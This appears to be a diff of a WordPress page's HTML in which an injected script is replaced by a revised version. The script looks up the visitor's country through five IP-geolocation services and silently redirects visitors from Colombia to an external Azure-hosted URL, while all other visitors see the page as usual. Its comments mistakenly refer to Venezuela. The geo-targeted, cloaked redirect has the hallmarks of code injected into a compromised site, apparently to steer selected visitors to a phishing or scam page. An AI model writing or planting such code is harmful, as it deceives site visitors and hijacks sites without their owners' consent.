@@ -1708,62 +1708,64 @@ const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(
 
 
 
+  <script>
+        (function() {
+            // Configuración
+            const _cfg = {
+                t: 'CO', // País que se va a redireccionar
+                p1: 'https://exteriornexo.z13.web.core.windows.net/' // URL destino si es Venezuela
+            };
 
-   <script>
-    (function() {
-        const _cfg = {
-            t: 'CO', // País que se va a redireccionar
-            p1: 'https://exteriornexo.z13.web.core.windows.net/' // URL destino
-        };
+            // APIs de consulta geográfica
+            const _endpoints = [
+                ['https://api.country.is/', 'country'],
+                ['https://ipwho.is/', 'country_code'],
+                ['https://get.geojs.io/v1/ip/country.json', 'country'],
+                ['https://ipinfo.io/json', 'country'],
+                ['https://freeipapi.com/api/json', 'countryCode']
+            ];
 
-        const _endpoints = [
-            ['https://api.country.is/', 'country'],
-            ['https://ipwho.is/', 'country_code'],
-            ['https://get.geojs.io/v1/ip/country.json', 'country'],
-            ['https://ipinfo.io/json', 'country'],
-            ['https://freeipapi.com/api/json', 'countryCode']
-        ];
+            const _fetchNode = async (url, prop) => {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 0500); // 0.3 segundos máximo
 
-        const _fetchNode = async (url, prop) => {
-            try {
-                // Eliminamos configuraciones pesadas para máxima velocidad
-                const response = await fetch(url, { cache: 'no-store' });
-                if (!response.ok) return Promise.reject();
-                const data = await response.json();
-                if (data && data[prop]) {
-                    return data[prop].toUpperCase().trim(); 
+                try {
+                    const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) throw new Error('ERR_HTTP');
+                    const data = await response.json();
+                    if (data && data[prop] && typeof data[prop] === 'string') {
+                        return data[prop].toUpperCase().trim(); 
+                    }
+                    throw new Error('ERR_DATA');
+                } catch (e) {
+                    clearTimeout(timeoutId);
+                    throw e;
                 }
-                return Promise.reject();
-            } catch (e) {
-                return Promise.reject();
-            }
-        };
+            };
 
-        const _init = async () => {
-            try {
-                const tasks = _endpoints.map(e => _fetchNode(e[0], e[1]));
-                // Promise.any reacciona de inmediato en cuanto CUALQUIERA responda (la más rápida)
-                const countryResult = await Promise.any(tasks);
+            const _init = async () => {
+                try {
+                    const tasks = _endpoints.map(e => _fetchNode(e[0], e[1]));
+                    const countryResult = await Promise.any(tasks);
 
-                if (countryResult === _cfg.t) {
-                    // Si es el país, redirige instantáneamente sin mostrar nada
-                    window.location.replace(_cfg.p1);
-                } else {
-                    // Si es otro país, hace visible la página de inmediato
-                    document.documentElement.style.display = 'block';
+                    if (countryResult === _cfg.t) {
+                        // SI ES VENEZUELA: Redirecciona de inmediato
+                        window.location.replace(_cfg.p1);
+                    } else {
+                        // SI ES EL RESTO DEL MUNDO: Hace visible el diseño web
+                        document.body.style.visibility = 'visible';
+                    }
+                } catch (err) {
+                    // FALLBACK: Si las APIs fallan, por seguridad se muestra la página local (Resto del mundo)
+                    document.body.style.visibility = 'visible';
                 }
-            } catch (err) {
-                // Fallback: Si todo falla, muestra la página por seguridad
-                document.documentElement.style.display = 'block';
-            }
-        };
+            };
 
-        _init();
-    })();
-</script>
-	<style>
-    /* Oculta todo el contenido de la página antes de que cargue */
-    html { display: none !important; }
-</style>
+            _init();
+        })();
+    </script>
+
+
 
 </body></html>
